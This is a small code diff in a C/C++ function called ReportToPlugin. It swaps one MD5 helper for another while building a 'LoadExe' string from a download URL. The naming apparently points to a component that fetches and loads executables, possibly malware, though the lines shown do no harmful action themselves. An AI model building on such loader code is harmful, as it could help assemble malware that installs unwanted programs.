@@ -225,7 +225,7 @@ bool ReportToPlugin( char *Url )
 			if ( DownloadUrl )
 			{
 				LoadExe=(char*)MemRealloc(LoadExe,33+m_lstrlen(LoadExe)+1);
-				m_lstrcat( LoadExe, CalcMd5SummFromStr(DownloadUrl).t_str());
+				m_lstrcat( LoadExe, MD5StrFromBuf(DownloadUrl, STRA::Length(DownloadUrl)).t_str());
 				m_lstrcat( LoadExe, "|");
 
 
